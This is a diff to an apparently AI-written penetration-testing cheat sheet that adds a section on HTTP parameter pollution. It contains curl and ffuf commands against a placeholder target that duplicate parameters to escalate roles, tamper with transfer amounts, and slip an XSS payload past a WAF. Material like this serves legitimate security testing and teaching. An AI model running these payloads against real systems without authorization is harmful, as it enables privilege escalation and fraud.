@@ -184,6 +184,38 @@ ffuf -u http://target.com/login -X POST -d "username=USER&password=PASS" -H "Con
 ffuf -u http://target.com/login -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -w users.txt:USER -w passes.txt:PASS -mode pitchfork -fc 401
 ```
 
+### Parameter Pollution
+
+Send the same parameter multiple times — different frameworks handle duplicates differently, which can bypass validation, WAF rules, or access controls.
+
+```bash
+# HTTP Parameter Pollution (HPP) basics
+# PHP: last value wins    → ?id=1&id=2  → id=2
+# ASP.NET: first value wins → ?id=1&id=2  → id=1
+# Node.js: array           → ?id=1&id=2  → id=['1','2']
+# Flask: first value wins
+
+# Auth bypass — if WAF checks first and app uses second (or vice versa)
+curl "http://target.com/api/user?role=guest&role=admin"
+curl "http://target.com/api/transfer?amount=1&amount=1000"
+
+# WAF bypass — inject clean value first, malicious second
+curl "http://target.com/search?q=hello&q=<script>alert(1)</script>"
+
+# JSON body pollution
+# Some parsers take the last key if duplicated
+curl -X POST http://target.com/api -H "Content-Type: application/json" \
+  -d '{"role":"user","role":"admin"}'
+
+# URL + body pollution
+curl -X POST "http://target.com/login?admin=false" -d "admin=true"
+
+# ffuf — fuzz the second value while fixing the first
+ffuf -u "http://target.com/api/item?id=1&id=FUZZ" -w ids.txt -fs <normal_size>
+```
+
+> [!note] HPP is easy to miss — most scanners only send each param once. Always test duplicated params manually when you find an interesting access control endpoint.
+
 ---
 
 ## API Endpoint Fuzzing
@@ -1376,5 +1408,5 @@ cat results.json | jq '.results[] | {url: .url, status: .status, length: .length
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
